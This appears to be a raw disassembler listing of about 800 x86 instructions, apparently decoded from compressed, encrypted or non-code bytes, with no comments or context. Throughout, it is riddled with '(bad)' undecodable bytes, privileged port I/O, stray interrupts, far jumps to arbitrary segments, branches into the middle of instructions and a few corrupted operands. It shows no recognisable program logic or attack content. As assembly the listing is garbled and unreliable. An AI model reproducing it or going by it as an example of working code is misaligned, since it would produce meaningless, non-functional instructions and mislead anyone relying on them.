  4046c0:	jl     0x404741
  4046c2:	sbb    ebx,eax
  4046c4:	(bad)  
  4046c5:	cld    
  4046c6:	ss jg  0x404668
  4046c9:	in     al,0x4e
  4046cb:	cmp    edi,DWORD PTR [edx-0x5a]
  4046ce:	mov    ah,0xf7
  4046d0:	push   edx
  4046d1:	sti    
  4046d2:	retf   
  4046d3:	ins    BYTE PTR es:[edi],dx
  4046d4:	popf   
  4046d5:	out    0x45,al
  4046d7:	push   ebx
  4046d8:	mov    ch,0xdf
  4046da:	out    dx,al
  4046db:	sahf   
  4046dc:	push   edi
  4046dd:	out    dx,eax
  4046de:	mov    dh,0x97
  4046e0:	xchg   esi,eax
  4046e1:	shl    DWORD PTR [edi+0x31],0xce
  4046e5:	mov    bl,0x7a
  4046e7:	push   ds
  4046e8:	push   ebx
  4046e9:	retf   0x3a35
  4046ec:	jno    0x404716
  4046ee:	(bad)  
  4046ef:	orps   xmm0,XMMWORD PTR [edi+eax*1+0x11]
  4046f4:	xor    BYTE PTR [ecx+0x21],bl
  4046f7:	pop    esp
  4046f8:	pusha  
  4046f9:	clc    
  4046fa:	inc    eax
  4046fb:	test   DWORD PTR [edx*4-0x1aa6afba],0x85b3e29
  404706:	or     cl,BYTE PTR [ebp-0x71]
  404709:	outs   dx,BYTE PTR ds:[esi]
  40470a:	scas   al,BYTE PTR es:[edi]
  40470b:	and    ah,dh
  40470d:	push   edi
  40470e:	fild   DWORD PTR [eax+0x38]
  404711:	push   ecx
  404712:	shl    DWORD PTR [ecx+eax*1+0x1fc67ddd],0x54
  40471a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40471b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40471c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40471d:	jecxz  0x4046cb
  40471f:	xor    dh,ah
  404721:	mov    DWORD PTR [edx-0x2df298e8],0xb8da7d85
  40472b:	int3   
  40472c:	sbb    BYTE PTR [esi-0x39],ch
  40472f:	xor    eax,0x5fe3cecf
  404734:	and    al,0x3b
  404736:	dec    ebp
  404737:	mov    bh,0xe0
  404739:	inc    esi
  40473a:	ins    BYTE PTR es:[edi],dx
  40473b:	nop
  40473c:	fsubr  st,st(2)
  40473e:	pusha  
  40473f:	push   0xffffffee
  404741:	sub    al,0x4b
  404743:	test   al,0x31
  404745:	jnp    0x4046ce
  404747:	sub    bl,BYTE PTR [edi]
  404749:	jne    0x4046de
  40474b:	mov    al,0x2f
  40474d:	inc    ecx
  40474e:	popa   
  40474f:	fs jmp 0x109c:0x7c48193
  404757:	(bad)
  40475a:	pop    es
  40475b:	pop    ebp
  40475c:	mov    al,ds:0x224a79f7
  404761:	add    DWORD PTR [ecx+0x69],edx
  404764:	mov    cl,BYTE PTR [eax]
  404766:	loopne 0x4047d6
  404768:	or     al,0x42
  40476a:	mov    WORD PTR [edi-0x12],ss
  40476d:	add    DWORD PTR [esi+0x5c24edf1],ebp
  404773:	shl    DWORD PTR [esi+0x36],1
  404776:	lahf   
  404777:	jno    0x4047ab
  404779:	jg     0x404717
  40477b:	idiv   ah
  40477d:	xchg   ebp,eax
  40477e:	jecxz  0x4047a0
  404780:	shl    bh,0xde
  404783:	popf   
  404784:	aas    
  404785:	imul   BYTE PTR [edi+0x76436aaf]
  40478b:	dec    ecx
  40478c:	arpl   WORD PTR [eax-0x793a5ca3],dx
  404792:	adc    DWORD PTR [ebx],ebx
  404794:	push   esi
  404795:	mov    edi,DWORD PTR [ebp-0x793f5d72]
  40479b:	imul   esp,DWORD PTR [ecx-0x68f8c1da],0x7d
  4047a2:	not    DWORD PTR [edi+0x61]
  4047a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047a6:	lods   al,BYTE PTR ds:[esi]
  4047a7:	leave  
  4047a8:	outs   dx,BYTE PTR ds:[esi]
  4047a9:	xchg   ebx,eax
  4047aa:	lods   eax,DWORD PTR ds:[esi]
  4047ab:	xor    DWORD PTR [ecx+ebx*1-0x5e],edi
  4047af:	aaa    
  4047b0:	sbb    eax,0x1ecf5969
  4047b5:	ss jbe 0x4047a9
  4047b8:	jl     0x4047a5
  4047ba:	adc    eax,0x433afd4a
  4047bf:	out    0x3c,al
  4047c1:	fld    DWORD PTR [eax]
  4047c3:	jmp    0xd9cf:0x5ce3923c
  4047ca:	jecxz  0x404834
  4047cc:	push   ecx
  4047cd:	xchg   BYTE PTR [edx+0x2608ff49],ch
  4047d3:	adc    BYTE PTR [edx+0x27772749],0xeb
  4047da:	adc    al,0x16
  4047dc:	and    ah,al
  4047de:	push   cs
  4047df:	loopne 0x40484b
  4047e1:	sbb    edx,DWORD PTR ds:0x38a7c9c4
  4047e7:	push   edx
  4047e8:	jmp    0x40485d
  4047ea:	and    BYTE PTR [edi+0x3],al
  4047ed:	fwait
  4047ee:	sbb    BYTE PTR ss:[ecx-0x4],cl
  4047f2:	xchg   edi,eax
  4047f3:	jns    0x404780
  4047f5:	ret    
  4047f6:	mov    esi,0x3d346c59
  4047fb:	xchg   ecx,eax
  4047fc:	into   
  4047fd:	repz mov esi,0x84ccb1d0
  404803:	or     eax,0x76ee0a1f
  404808:	mov    bh,0x57
  40480a:	ja     0x40478f
  40480c:	push   ds
  40480d:	mov    ds:0xfeea3182,eax
  404812:	pop    edi
  404813:	int    0x3f
  404815:	sahf   
  404816:	push   0x7eb03273
  40481b:	mov    ds:0x7c6b471d,al
  404820:	jnp    0x4047c7
  404822:	int3   
  404823:	out    0x13,eax
  404825:	jns    0x4047c7
  404827:	pop    es
  404828:	mov    ah,0x4e
  40482a:	lods   eax,DWORD PTR ds:[esi]
  40482b:	gs stos DWORD PTR es:[edi],eax
  40482d:	addr16 in al,0x28
  404830:	adc    dl,ch
  404832:	push   esp
  404833:	lds    edi,FWORD PTR [ecx+0x45]
  404836:	repz and ecx,DWORD PTR [eax-0x2578be71]
  40483d:	or     eax,0x6d4ac850
  404842:	or     bl,0xc6
  404845:	fs dec ecx
  404847:	fs out dx,al
  404849:	mov    edi,cs
  40484b:	mov    ebx,fs
  40484d:	pop    ecx
  40484e:	cmp    eax,esi
  404850:	call   0x3fae:0x2beacadc
  404857:	mov    bh,0xa9
  404859:	xchg   ecx,eax
  40485a:	repz mov eax,ds:0x231db617
  404860:	cdq    
  404861:	xchg   bh,dl
  404863:	and    al,0x7c
  404865:	aad    0xe5
  404867:	fild   WORD PTR [edi-0x6769484e]
  40486d:	outs   dx,DWORD PTR ds:[esi]
  40486e:	and    al,0x8c
  404870:	fld    DWORD PTR [ebx+edx*4]
  404873:	retf   0x5b00
  404876:	cmp    eax,0xea2e2462
  40487b:	pop    ebx
  40487c:	ins    DWORD PTR es:[edi],dx
  40487d:	popa   
  40487e:	xor    eax,0xffffff86
  404881:	test   DWORD PTR [ecx-0x54],0xa6ee9b4a
  404888:	hlt    
  404889:	pop    es
  40488a:	sub    esi,DWORD PTR [edi+0x6b9c33d9]
  404890:	mov    eax,ds:0x4ad9ff2f
  404895:	mov    al,0x42
  404897:	pop    ecx
  404898:	(bad)  
  404899:	or     ecx,DWORD PTR ds:0x33798314
  40489f:	xchg   esi,eax
  4048a0:	out    0x79,eax
  4048a2:	int    0x30
  4048a4:	cmp    ebx,DWORD PTR [eax-0x65]
  4048a7:	cmp    eax,0x28572d1c
  4048ac:	xchg   edi,eax
  4048ad:	pushf  
  4048ae:	lds    edx,FWORD PTR [edi-0x57a18c28]
  4048b4:	jb     0x40488f
  4048b6:	xor    BYTE PTR [ecx+eiz*4-0x1539a3b6],bh
  4048bd:	fs push cs
  4048bf:	adc    ebp,DWORD PTR [ebx]
  4048c1:	dec    esp
  4048c2:	mov    dl,0xbf
  4048c4:	pushf  
  4048c5:	xor    eax,0x8a7808f5
  4048ca:	mov    ah,0x1f
  4048cc:	and    eax,esi
  4048ce:	and    al,0x50
  4048d0:	mov    bh,0x75
  4048d2:	clc    
  4048d3:	pop    esi
  4048d4:	and    bl,BYTE PTR [esi]
  4048d6:	sbb    BYTE PTR [eax-0x6b],dl
  4048d9:	inc    ecx
  4048da:	(bad)  
  4048db:	out    0xa,al
  4048dd:	lods   eax,DWORD PTR ds:[esi]
  4048de:	or     BYTE PTR [ecx+edi*1],0x4b
  4048e2:	sahf   
  4048e3:	push   ebp
  4048e4:	fadd   QWORD PTR [ecx-0x27]
  4048e7:	gs push edi
  4048e9:	into   
  4048ea:	outs   dx,DWORD PTR ds:[esi]
  4048eb:	mov    ebx,0x72dd1b51
  4048f0:	add    ah,BYTE PTR [eax+0x383b8a3f]
  4048f6:	push   0xb6c228c3
  4048fb:	xchg   esi,eax
  4048fc:	push   0x7fe0829f
  404901:	sub    al,0x55
  404903:	das    
  404904:	ror    BYTE PTR [ebp-0x5b9e4cbc],0x5b
  40490b:	push   0x75fbb052
  404910:	sub    al,0x29
  404912:	ds xchg ecx,eax
  404914:	sbb    ch,BYTE PTR [ebx+0x625a2b81]
  40491a:	jp     0x40496d
  40491c:	js     0x4048b6
  40491e:	and    al,0x66
  404920:	mov    edx,0xdc70c201
  404925:	adc    edi,ebx
  404927:	ja     0x4048e8
  404929:	hlt    
  40492a:	dec    eax
  40492b:	jmp    0x95e75a2
  404930:	pop    ebp
  404931:	jbe    0x4048cd
  404933:	xor    ebx,edi
  404935:	mov    fs,WORD PTR [ecx-0x8]
  404938:	scas   eax,DWORD PTR es:[edi]
  404939:	mov    ebx,DWORD PTR [eax]
  40493b:	adc    al,0x5b
  40493d:	mov    edx,0x7be31cc
  404942:	scas   al,BYTE PTR es:[edi]
  404943:	ret    0xa7f0
  404946:	cdq    
  404947:	addr16 in eax,0xf5
  40494a:	(bad)  
  40494b:	mov    ebx,0xfbb3ce23
  404950:	ins    DWORD PTR es:[edi],dx
  404951:	and    eax,0x7b306662
  404956:	adc    BYTE PTR [eax+0x5f],dl
  404959:	xchg   esp,eax
  40495a:	mov    edi,0x86f5b29a
  40495f:	mov    ds:0xd323d912,al
  404964:	jmp    0x84d2:0xb87eec48
  40496b:	in     al,0xa4
  40496d:	fist   DWORD PTR [esi]
  40496f:	xchg   edi,eax
  404970:	xor    esp,ebx
  404972:	fbld   TBYTE PTR [ebp+0xcab57c4]
  404978:	dec    esi
  404979:	push   esp
  40497a:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40497c:	(bad)  
  40497d:	dec    edx
  40497e:	sti    
  40497f:	fsubr  DWORD PTR [edi+0x63]
  404982:	sti    
  404983:	daa    
  404984:	pop    esp
  404985:	jns    0x404976
  404987:	add    al,BYTE PTR [edi+0x24]
  40498a:	outs   dx,DWORD PTR ds:[esi]
  40498b:	inc    edx
  40498c:	scas   al,BYTE PTR es:[edi]
  40498d:	into   
  40498e:	jo     0x4049d5
  404990:	cmc    
  404991:	adc    ch,cl
  404993:	test   DWORD PTR [edx+0x4d],edi
  404996:	pop    ecx
  404997:	xchg   ecx,eax
  404998:	push   edx
  404999:	scas   eax,DWORD PTR es:[edi]
  40499a:	jne    0x404933
  40499c:	loopne 0x4049ae
  40499e:	push   ebp
  40499f:	xchg   edi,eax
  4049a0:	mov    cl,0x97
  4049a2:	jmp    0x749a:0x1d0bbc46
  4049a9:	aaa    
  4049aa:	adc    eax,0x5f3acf51
  4049af:	xchg   edi,eax
  4049b0:	icebp  
  4049b1:	push   ebx
  4049b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049b3:	inc    edi
  4049b4:	adc    ecx,eax
  4049b6:	stos   DWORD PTR es:[edi],eax
  4049b7:	mov    cl,0x1c
  4049b9:	jno    0x404a1b
  4049bb:	or     cl,ah
  4049bd:	sub    DWORD PTR [ebx-0x3ff2ee07],ecx
  4049c3:	das    
  4049c4:	out    dx,eax
  4049c5:	ss jl  0x404986
  4049c8:	pop    ebx
  4049c9:	sub    eax,0xf6843d39
  4049ce:	jb     0x404a33
  4049d0:	fist   WORD PTR [esi]
  4049d2:	(bad)  
  4049d3:	into   
  4049d4:	scas   al,BYTE PTR es:[edi]
  4049d5:	push   esp
  4049d6:	sar    DWORD PTR [ebx],0xd6
  4049d9:	jmp    0x4049c5
  4049db:	sub    eax,0x48146603
  4049e0:	sub    BYTE PTR [ebx],0x47
  4049e3:	daa    
  4049e4:	int    0x8b
  4049e6:	popa   
  4049e7:	dec    edi
  4049e8:	mov    ch,ch
  4049ea:	add    esp,ebx
  4049ec:	repz fiadd DWORD PTR [esi]
  4049ef:	fimul  WORD PTR ds:[ebp-0x69]
  4049f3:	int    0x4f
  4049f5:	cmc    
  4049f6:	pop    ecx
  4049f7:	sbb    DWORD PTR [edi],esp
  4049f9:	push   ebx
  4049fa:	jge    0x404a08
  4049fc:	mov    al,0xa6
  4049fe:	sub    bh,BYTE PTR [edx+0x2e]
  404a01:	push   ecx
  404a02:	xchg   edi,eax
  404a03:	pop    ds
  404a04:	out    0x8b,eax
  404a06:	add    edi,esi
  404a08:	inc    ebp
  404a09:	rol    ebx,1
  404a0b:	xchg   ecx,eax
  404a0c:	jnp    0x4049aa
  404a0e:	mov    al,0x15
  404a10:	adc    al,BYTE PTR [ecx-0x57]
  404a13:	repnz xor BYTE PTR [edi+ebx*4+0x4d0ac7a1],bh
  404a1b:	fs (bad) 
  404a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a1e:	lods   al,BYTE PTR ds:[esi]
  404a1f:	pop    ebx
  404a20:	call   0x6cec:0x5ae6ba95
  404a27:	nop
  404a28:	pusha  
  404a29:	dec    DWORD PTR [eax]
  404a2b:	ins    DWORD PTR es:[edi],dx
  404a2c:	xor    eax,DWORD PTR [ebx+ebp*1]
  404a2f:	fld    DWORD PTR [edi]
  404a31:	sbb    DWORD PTR [edx],ebx
  404a33:	div    DWORD PTR [esi+edx*1+0x109cb4ae]
  404a3a:	out    0x85,eax
  404a3c:	mov    ebp,DWORD PTR [ebx]
  404a3e:	aaa    
  404a3f:	pop    edi
  404a40:	fwait
  404a41:	mov    ds:0xb05721a0,eax
  404a46:	sub    DWORD PTR [esi],ebx
  404a48:	out    dx,eax
  404a49:	shl    edi,cl
  404a4b:	outs   dx,BYTE PTR ds:[esi]
  404a4c:	or     edx,ebx
  404a4e:	loopne 0x404aae
  404a50:	lock lods al,BYTE PTR ds:[esi]
  404a52:	outs   dx,BYTE PTR ds:[esi]
  404a53:	daa    
  404a54:	push   ds
  404a55:	and    al,0xa3
  404a57:	lods   eax,DWORD PTR ds:[esi]
  404a58:	repz inc eax
  404a5a:	push   edx
  404a5b:	inc    eax
  404a5c:	leave  
  404a5d:	mov    BYTE PTR [edx+0x285fda19],dl
  404a63:	add    dl,al
  404a65:	nop
  404a66:	pop    es
  404a67:	add    dl,dl
  404a69:	sar    BYTE PTR ds:0xa3dc251a,cl
  404a6f:	stos   DWORD PTR es:[edi],eax
  404a70:	es sbb eax,0xc345ade
  404a76:	aad    0xde
  404a78:	shl    BYTE PTR [edx+ebp*2-0x4dd0d6f5],cl
  404a7f:	mov    esp,0xbf46c234
  404a84:	test   eax,0xcde58f09
  404a89:	add    al,0xb0
  404a8b:	lea    edx,[ecx+edi*4]
  404a8e:	push   ss
  404a8f:	add    DWORD PTR [esi-0x69aaf712],edi
  404a95:	mov    ds:0x78431974,al
  404a9a:	cwde   
  404a9b:	mov    ecx,0x4639f57e
  404aa0:	cmp    ecx,0xc
  404aa3:	mul    DWORD PTR [edx-0x58]
  404aa6:	jmp    0x404ae3
  404aa8:	cmp    DWORD PTR [ebx+0x15fdc5fb],ebx
  404aae:	aaa    
  404aaf:	dec    edx
  404ab0:	ror    bh,cl
  404ab2:	nop
  404ab3:	dec    ecx
  404ab4:	loop   0x404ac7
  404ab6:	xchg   edx,eax
  404ab7:	pusha  
  404ab8:	sbb    bl,dh
  404aba:	in     al,dx
  404abb:	xchg   BYTE PTR fs:[esi],ch
  404abe:	cmp    al,0xe3
  404ac0:	sbb    al,0x9a
  404ac2:	mov    bh,0xc9
  404ac4:	inc    eax
  404ac5:	adc    eax,0xbff535d3
  404aca:	les    edx,FWORD PTR es:[ebx+0x3f]
  404ace:	cmp    dl,bh
  404ad0:	pop    esi
  404ad1:	mov    edi,0xd1dd44f2
  404ad6:	add    eax,0x755ded52
  404adb:	cmp    BYTE PTR [esi-0x2f],0xaf
  404adf:	mov    ebx,0x2ea37466
  404ae4:	push   edi
  404ae5:	js     0x404a90
  404ae7:	in     eax,0x6a
  404ae9:	nop
  404aea:	pop    ss
  404aeb:	and    ah,BYTE PTR [esi-0x75]
  404aee:	add    eax,0xf923ba1d
  404af3:	cmp    BYTE PTR [ebp-0x71],al
  404af6:	mov    ebx,?
  404af8:	cmp    dh,BYTE PTR [edx-0x64]
  404afb:	daa    
  404afc:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  404afe:	in     eax,0x1
  404b00:	mov    al,0x6
  404b02:	jno    0xae1f5cad
  404b08:	cmc    
  404b09:	jp     0x404b1b
  404b0b:	shl    BYTE PTR [esi+0x5ae9d646],cl
  404b11:	pusha  
  404b12:	jp     0x404b2b
  404b14:	fnstenv es:[edx]
  404b17:	add    DWORD PTR [ecx-0x5a],0xb0c4c2c7
  404b1e:	enter  0xfbe7,0x98
  404b22:	cmp    BYTE PTR [ebp+0x14958323],dh
  404b28:	in     al,0xa3
  404b2a:	fsub   st(4),st
  404b2c:	fsub   st,st(0)
  404b2e:	test   DWORD PTR ds:0xc35c0a00,ecx
  404b34:	inc    BYTE PTR ds:0xbef7bf91
  404b3a:	es cmp cl,al
  404b3d:	or     DWORD PTR [ebx],0xbb9f4ca2
  404b43:	xchg   edx,eax
  404b44:	fs mov ecx,0x4dfda75
  404b4a:	mov    ds:0xd4551478,eax
  404b4f:	loope  0x404af1
  404b51:	inc    ecx
  404b52:	push   esi
  404b53:	cmp    eax,0x3e8696c3
  404b58:	push   eax
  404b59:	imul   edi,DWORD PTR [ebp+0x57],0x9eae2ebd
  404b60:	daa    
  404b61:	adc    al,0x15
  404b63:	mov    ecx,0x3e0f81a
  404b68:	pop    ds
  404b69:	or     eax,0x12b85016
  404b6e:	stc    
  404b6f:	jg     0x404b32
  404b71:	lahf   
  404b72:	repz sub al,0x4e
  404b75:	lea    edi,[esi]
  404b77:	das    
  404b78:	cvtpi2ps xmm0,QWORD PTR [esi-0x40e36153]
  404b7f:	cmp    eax,0xa770a0ae
  404b84:	xchg   edi,eax
  404b85:	sbb    eax,0x3686692d
  404b8a:	cmp    eax,0x57be1ee0
  404b8f:	xchg   esp,ebp
  404b91:	jle    0x404b54
  404b93:	add    DWORD PTR [edi-0x51d44074],esi
  404b99:	shr    DWORD PTR [edi+ebp*1],0x1c
  404b9d:	cmp    BYTE PTR [esi],ch
  404b9f:	and    BYTE PTR [edi-0x5588d073],dh
  404ba5:	std    
  404ba6:	mov    edi,0x4626dbff
  404bab:	dec    edi
  404bac:	xchg   edx,eax
  404bad:	stos   DWORD PTR es:[edi],eax
  404bae:	in     al,dx
  404baf:	dec    esi
  404bb0:	add    esp,DWORD PTR [ebp-0x4cb7f3f6]
  404bb6:	pop    esi
  404bb7:	mov    ds:0xd4b0818e,eax
  404bbc:	outs   dx,BYTE PTR ds:[esi]
  404bbd:	and    al,0xb9
  404bbf:	scas   al,BYTE PTR es:[edi]
  404bc0:	cs into 
  404bc2:	fisubr WORD PTR [esi+0x18]
  404bc5:	xchg   BYTE PTR [edx],bh
  404bc7:	cmp    dh,BYTE PTR [edx+esi*2-0x17]
  404bcb:	or     BYTE PTR [ebx+eax*2],dh
  404bce:	lds    edi,FWORD PTR [ebx]
  404bd0:	cmp    al,0xa2
  404bd2:	jne    0x404c00
  404bd4:	jg     0x404b84
  404bd6:	adc    dh,ah
  404bd8:	cmp    bh,BYTE PTR [eax]
  404bda:	add    eax,edx
  404bdc:	lods   al,BYTE PTR ds:[esi]
  404bdd:	sub    DWORD PTR [ecx+0x46],esp
  404be0:	dec    edx
  404be1:	push   edx
  404be2:	outs   dx,DWORD PTR ds:[esi]
  404be3:	(bad)  
  404be4:	xchg   edi,eax
  404be5:	push   ds
  404be6:	jae    0x404b93
  404be8:	rcl    DWORD PTR [ebp+0x28],0xaa
  404bec:	mov    ?,WORD PTR [esi+0x25]
  404bef:	pop    ebp
  404bf0:	cwde   
  404bf1:	cli    
  404bf2:	les    esi,FWORD PTR [ebp+0x45]
  404bf5:	loop   0x404c53
  404bf7:	push   edi
  404bf8:	rcr    bl,cl
  404bfa:	ret    
  404bfb:	sahf   
  404bfc:	or     ecx,DWORD PTR [esi]
  404bfe:	ret    0x3b07
  404c01:	call   0x511e:0xe1fa3f91
  404c08:	mov    es,esi
  404c0a:	in     al,0x98
  404c0c:	scas   al,BYTE PTR es:[edi]
  404c0d:	and    al,0x7f
  404c0f:	mov    ebp,0xba84a1e5
  404c14:	in     eax,dx
  404c15:	xchg   ecx,eax
  404c16:	stos   BYTE PTR es:[edi],al
  404c17:	aas    
  404c18:	lock aaa 
  404c1a:	push   esp
  404c1b:	jne    0x404bc1
  404c1d:	or     al,0x31
  404c1f:	test   DWORD PTR [esi+edi*2+0x9785793],edx
  404c26:	out    0xf2,eax
  404c28:	xchg   ebp,eax
  404c29:	jmp    0x6a44:0x5393e043
  404c30:	cmp    DWORD PTR [ebp-0x22],ecx
  404c33:	jge    0x404bbd
  404c35:	xchg   ebp,eax
  404c36:	add    al,0x7
  404c38:	jnp    0x404c5a
  404c3a:	cmp    DWORD PTR [esi],ebx
  404c3c:	push   edx
  404c3d:	add    ch,ch
  404c3f:	xlat   BYTE PTR ds:[ebx]
  404c40:	inc    edx
  404c41:	fstp   st(7)
  404c43:	mov    al,0x2a
  404c45:	cmp    al,0x18
  404c47:	fstp   TBYTE PTR [ebp+edx*1-0x34]
  404c4b:	ins    DWORD PTR es:[edi],dx
  404c4c:	or     ebx,DWORD PTR [ebx+ebp*2]
  404c4f:	std    
  404c50:	inc    esi
  404c51:	dec    esp
  404c52:	bound  edi,QWORD PTR ds:0xeb1d719d
  404c58:	push   ebp
  404c59:	sbb    BYTE PTR [ecx],ch
  404c5b:	pop    ebx
  404c5c:	(bad)  
  404c5d:	pop    es
  404c5e:	(bad)  
  404c5f:	cmp    al,0x36
  404c61:	dec    esi
  404c62:	loop   0x404cb3
  404c64:	ss aam 0x68
  404c67:	out    dx,al
  404c68:	jle    0x404c14
  404c6a:	push   edi
  404c6b:	inc    esp
  404c6c:	ja     0x404c71
  404c6e:	inc    edi
  404c6f:	push   0xe9a310b7
  404c74:	test   ecx,eax
  404c76:	mov    edi,0x8601c4b8
  404c7b:	pop    ds
  404c7c:	mov    esp,0xfcef2a2b
  404c81:	inc    ebx
  404c82:	dec    edx
  404c83:	mov    BYTE PTR [esi],dh
  404c85:	scas   eax,DWORD PTR es:[edi]
  404c86:	aam    0x79
  404c88:	add    DWORD PTR [esi+ecx*8-0x54],ebx
  404c8c:	loope  0x404c8c
  404c8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c8f:	(bad)  
  404c90:	aad    0x61
  404c92:	mov    ds:0xf9e0a7a8,eax
  404c97:	sbb    DWORD PTR [ebx-0x37],edi
  404c9a:	pop    ebx
  404c9b:	mov    eax,ds:0x226384ed
  404ca0:	mov    ah,0x7a
  404ca2:	and    al,ch
  404ca4:	dec    ebx
  404ca5:	xchg   esp,eax
  404ca6:	push   ecx
  404ca7:	or     DWORD PTR [edx+edi*2-0x357d3917],esi
  404cae:	mov    ds:0x4c2dfb6a,eax
  404cb3:	int    0xba
  404cb5:	xor    al,0xae
  404cb7:	push   ss
  404cb8:	cli    
  404cb9:	cmp    DWORD PTR [ebp-0x22],edi
  404cbc:	fwait
  404cbd:	add    edi,DWORD PTR [esi-0x20a7b947]
  404cc3:	or     BYTE PTR [eax-0x4a],bh
  404cc6:	xchg   edi,eax
  404cc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cc8:	push   cs
  404cc9:	sub    dh,ah
  404ccb:	bnd js 0x404cc6
  404cce:	int3   
  404ccf:	jae    0x404cbb
  404cd1:	shr    esi,cl
  404cd3:	or     eax,0x3760da88
  404cd8:	outs   dx,DWORD PTR ds:[esi]
  404cd9:	xchg   esi,eax
  404cda:	xlat   BYTE PTR ds:[ebx]
  404cdb:	sahf   
  404cdc:	daa    
  404cdd:	sub    ah,BYTE PTR [edi+ebx*2+0x5e7e59ff]
  404ce4:	mov    dl,0xab
  404ce6:	idiv   DWORD PTR [ebx+0x4f807a0e]
  404cec:	scas   al,BYTE PTR es:[di]
  404cee:	xor    ecx,ebp
  404cf0:	popa   
  404cf1:	ret    
  404cf2:	mov    al,ds:0x921d4e01
  404cf7:	dec    esp
  404cf8:	cli    
  404cf9:	jecxz  0x404cc7
  404cfb:	pusha  
  404cfc:	adc    eax,0xae9d1eac
  404d01:	fsub   DWORD PTR [ebx+0x56dd36ca]
  404d07:	cdq    
  404d08:	cmp    ah,bl
  404d0a:	lods   eax,DWORD PTR ds:[esi]
  404d0b:	pop    edx
  404d0c:	jne    0x404d43
  404d0e:	je     0x404d1d
  404d10:	jmp    0x404c96
  404d12:	mov    eax,ds:0x2ef1014f
  404d17:	retf   
  404d18:	push   0xffffffb6
  404d1a:	fistp  WORD PTR [edx+ecx*2]
  404d1d:	and    eax,0xb749d9e5
  404d22:	push   ss
  404d23:	and    BYTE PTR [edx-0x59],0x89
  404d27:	mov    ch,0x41
  404d29:	push   ss
  404d2a:	push   ebp
  404d2b:	das    
  404d2c:	stos   DWORD PTR es:[edi],eax
  404d2d:	xlat   BYTE PTR ds:[ebx]
  404d2e:	(bad)  
  404d2f:	(bad)  
  404d30:	pop    esp
  404d31:	jmp    0xa4d3efc0
  404d36:	pop    ebx
  404d37:	dec    ecx
  404d38:	sub    ecx,ebp
  404d3a:	sub    eax,0xd1a72b41
  404d3f:	nop
  404d40:	cli    
  404d41:	pop    esp
  404d42:	out    dx,al
  404d43:	inc    edx
  404d44:	pop    esp
  404d45:	push   edi
  404d46:	cmc    
  404d47:	rcl    ebx,cl
  404d49:	dec    edi
  404d4a:	inc    edi
  404d4b:	rcl    DWORD PTR [ecx+0xa],0x71
  404d4f:	cmp    ah,BYTE PTR [edi+0x25]
  404d52:	sub    DWORD PTR [ecx+eax*1-0x30],eax
  404d56:	shr    DWORD PTR [esi],0x44
  404d59:	pop    ecx
  404d5a:	psubsb mm6,QWORD PTR [ebp-0x7bf030a1]
  404d61:	mov    al,ds:0xff92c450
  404d66:	or     bl,BYTE PTR [ecx+0x69]
  404d69:	lds    ebx,FWORD PTR [edi]
  404d6b:	cs inc ebp
  404d6d:	sahf   
  404d6e:	mov    esi,0xb5ddffa0
  404d73:	sahf   
  404d74:	jo     0x404d65
  404d76:	mov    eax,ds:0xa4286819
  404d7b:	sbb    eax,DWORD PTR [ebp+0x2c84f3c4]
  404d81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d82:	and    dl,BYTE PTR [esi-0x348634df]
  404d88:	fcomp  DWORD PTR [ecx+0xf]
  404d8b:	cdq    
  404d8c:	mov    ebp,0x1704fb07
  404d91:	neg    BYTE PTR [ecx+0x40]
  404d94:	repz pop ebp
  404d96:	(bad)
  404d99:	jmp    0x4aef:0xb1443f1b
  404da0:	das    
  404da1:	lods   eax,DWORD PTR ds:[esi]
  404da2:	and    ecx,DWORD PTR [ecx+0x652bbc9e]
  404da8:	loope  0x404dd8
  404daa:	sar    DWORD PTR [eax],1
  404dac:	outs   dx,BYTE PTR ds:[esi]
  404dad:	or     DWORD PTR [edx],0xffffff92
  404db0:	pop    ecx
  404db1:	(bad)  
  404db2:	out    dx,al
  404db3:	daa    
  404db4:	xchg   edx,eax
  404db5:	ins    BYTE PTR es:[edi],dx
  404db6:	xlat   BYTE PTR ds:[ebx]
  404db7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404db8:	mov    edi,0xd43d0ed7
  404dbd:	mov    edx,0x260d9a60
  404dc2:	jae    0x404df7
  404dc4:	in     al,0xb7
  404dc6:	mov    ds:0xa20de37d,al
  404dcb:	inc    eax
  404dcc:	mov    BYTE PTR [ebx+0xe],cl
  404dcf:	lods   eax,DWORD PTR ds:[esi]
  404dd0:	fdiv   st(2),st
  404dd2:	sub    eax,0xaa97c492
  404dd7:	mov    eax,ds:0x6ec225ed
  404ddc:	mov    edi,0x7bded371
  404de1:	inc    eax
  404de2:	js     0x404d98
  404de4:	je     0x404d6a
  404de6:	inc    ebp
  404de7:	xor    al,0x40
  404de9:	pop    ss
  404dea:	arpl   WORD PTR [esi-0x4b],sp
  404ded:	cmp    eax,0x7fc0a3f1
  404df2:	nop
  404df3:	rep stos DWORD PTR es:[edi],eax
  404df5:	adc    BYTE PTR [ecx],bl
  404df7:	dec    esi
  404df8:	adc    eax,0x3660cb83
  404dfd:	pop    ebp
  404dfe:	gs mov cl,0x1a
  404e01:	adc    al,0x4a
  404e03:	(bad)  
  404e05:	(bad)
  404e08:	dec    ecx
  404e09:	test   DWORD PTR [eax],ecx
  404e0b:	pop    esp
  404e0c:	push   ss
  404e0d:	or     al,0x12
  404e0f:	clc    
  404e10:	xor    BYTE PTR [ebp-0x59],cl
  404e13:	or     DWORD PTR [edx+0x35d2c582],eax
  404e19:	jle    0xe4d32ed8
  404e1f:	mov    al,0xc2
  404e21:	int3   
  404e22:	pop    ebp
  404e23:	dec    DWORD PTR [ebx-0x7aca7170]
  404e29:	mov    al,0x5
  404e2b:	out    0xb4,al
  404e2d:	sub    ch,BYTE PTR [ebx]
  404e2f:	add    esi,DWORD PTR [edx]
  404e31:	outs   dx,BYTE PTR ds:[esi]
  404e32:	in     eax,0x4
  404e34:	in     eax,dx
  404e35:	sub    al,BYTE PTR [eax*8-0x5f160920]
